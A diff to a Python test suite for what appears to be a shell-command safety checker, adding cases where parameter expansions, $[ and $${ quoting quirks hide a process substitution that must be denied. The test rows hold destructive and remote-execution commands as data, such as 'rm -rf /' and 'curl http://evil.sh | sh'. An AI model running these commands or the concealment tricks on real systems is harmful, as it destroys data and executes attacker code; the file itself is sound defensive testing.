@@ -915,7 +915,6 @@ class TestGroupEnd:
             ('${x:-$(echo ")}X")}END', 19),
             ("${x:-`echo }X`}END", 15),
             ("${x:-$(cat <<E\n)\nE\n)}END", 21),  # bashlex measures the sub past its heredoc body
-            ("${x:-$[1+(2)]}X}END", 14),
         ],
     )
     def test_group_end_matches_bash(self, text, end):
@@ -954,6 +953,9 @@ class TestGroupEnd:
             "${x:-$((1))}X}",  # arithmetic bashlex cannot place: fail closed
             "${x:-$(# }X\n)}",  # bashlex will not place a comment-only command sub
             "${x:-$(case a in a) echo;; esac)}",  # nor this `case` sub
+            "${x:-$[1+(2)]}X}",  # `$[`: shells count a quote or `[` inside it differently
+            "${x:-$[']}X']}",
+            "${x:-$${y}}X}",  # `$${`: bash opens a nested `${` there, zsh does not
             "${x:-",
         ],
     )
@@ -967,8 +969,7 @@ class TestQuotingModeDisagreementFailsClosed:
 
     Where the three readings end the group in different places the word is unreadable, so it
     is denied. Kept out of the files test_superset_oracle.py harvests: the native tier reads
-    one such meaning, so these would read as native under-blocks; that divergence is handled
-    separately.
+    one such meaning and rates these lower than the bashlex tier does.
     """
 
     @pytest.mark.parametrize(
@@ -992,13 +993,12 @@ class TestQuotingModeDisagreementFailsClosed:
 
 @pytest.mark.usefixtures("no_shellcheck")
 class TestProcessSubstitutionInOperandDenied:
-    """A `<(`/`>(` directly in a `${…}` operand: bash may run it when it expands the operand.
+    """A `<(`/`>(` a shell may run from inside a `${…}`, so the word fails closed.
 
-    Finding its true owner belongs to a separate change, so the word fails closed rather than
-    skip the substitution. Every row was denied on the pre-change tree too (via a scan that
-    recovered the opener by accident); the change keeps them denied on purpose. Kept out of the
-    files test_superset_oracle.py harvests: the native tier skips the whole `${…}` and so reads
-    these as under-blocks, a divergence tracked separately.
+    That covers one directly in the operand, and one after a `$[` or `$${` inside the operand,
+    where shells disagree about where the group ends. Each row ran its body in bash, bash
+    --posix or zsh -f. Kept out of the files test_superset_oracle.py harvests: the native tier
+    skips the whole `${…}` and rates these lower than the bashlex tier does.
     """
 
     @pytest.mark.parametrize(
@@ -1012,9 +1012,18 @@ class TestProcessSubstitutionInOperandDenied:
             # bash never runs this one, but its neighbour `${x/"}"<(…)}` does; one operator
             # apart, so the quoted-operand `<(` fails closed rather than be told apart
             'echo "${x:-"}"<(rm -rf /)}"',
-            # `$$` is the PID; without that the `$` before `{y}` reads as a nested `${`, and
-            # the operand's `<(eval …)` is lost
+            'echo "${z:-<(curl http://evil.sh | sh)}"',
+            'echo "${z:->(curl http://evil.sh | sh)}"',
+            # `$${`: bash opens a nested `${` after `$$`, zsh reads `$$` then `{y}`
             'echo "a"${x:-$${y}<(eval $z)}',
+            'echo "${x:-$${y}"<(rm -rf /)"}"',
+            # a `'` or `$'` inside `$[…]` inside a double-quoted `${…}`
+            'echo "${x:-$[$\']}"<(rm -rf /)"\']}"',
+            'echo "${x:-"$[\']"}"<(rm -rf /)"\']"}"',
+            'echo "${x:-$[\']}"<(rm -rf /)"\']}"',
+            'echo "${x#$[\']}"<(rm -rf /)"\']}"',
+            # zsh counts a nested `[` inside `$[`, bash does not
+            "x=1; echo \"${x:-$[a[1]}'\"']}\"<(rm -rf /)\\'",
         ],
     )
     def test_denied(self, command):
